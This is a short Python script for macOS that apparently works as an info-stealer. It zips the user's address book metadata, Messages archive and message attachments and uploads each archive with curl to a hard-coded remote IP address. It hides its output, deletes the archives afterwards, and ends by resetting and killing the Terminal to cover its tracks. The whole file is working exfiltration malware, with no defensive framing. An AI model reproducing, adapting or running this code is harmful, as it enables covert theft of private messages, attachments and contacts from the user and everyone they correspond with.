#!/usr/bin/env python
import os
import shutil
import getpass
from os.path import expanduser
import subprocess
from time import sleep
import sys
sys.stdout = os.devnull

enableATCH = 1
debug = 0

home = expanduser("~")

clocation = home + "/Library/Application Support/AddressBook/Metadata/"

uploadlink = "http://142.93.195.87:8080/"
# uploadlink = "http://localhost:8080/"

user = getpass.getuser()

zipname = "./{0}-contacts".format(user)

shutil.make_archive(zipname, 'zip', clocation)

with open(os.devnull, 'w') as fp:
    cmd = subprocess.Popen(['curl', '-sF', 'contact=@{0}.zip'.format(zipname), uploadlink, "&"], stdout=fp)
# This is not a good way to handle this but works for now
sleep(1)
if debug is 0:
    os.unlink(zipname + ".zip")

# Breaks after this

sleep(2)

clocation = home + "/Library/Messages/Archive"


zipname = "./{0}-messages".format(user)


shutil.make_archive(zipname, 'zip', clocation)

with open(os.devnull, 'w') as fp:
    cmd = subprocess.Popen(['curl', '-sF', 'contact=@{0}.zip'.format(zipname), uploadlink, "&"], stdout=fp)
sleep(4)
if debug is 0:
    os.unlink(zipname + ".zip")

if enableATCH is 1:
    clocation = home + "/Library/Messages/Attachments"

    zipname = "./{0}-attachments".format(user)

    shutil.make_archive(zipname, 'zip', clocation)

    with open(os.devnull, 'w') as fp:
        cmd = subprocess.Popen(['curl', '-sF', 'contact=@{0}.zip'.format(zipname), uploadlink, "&"], stdout=fp)
    sleep(5)
    if debug is 0:
        os.unlink(zipname + ".zip")

subprocess.call(['tput', 'reset'])
subprocess.call(['killall', 'Terminal'])
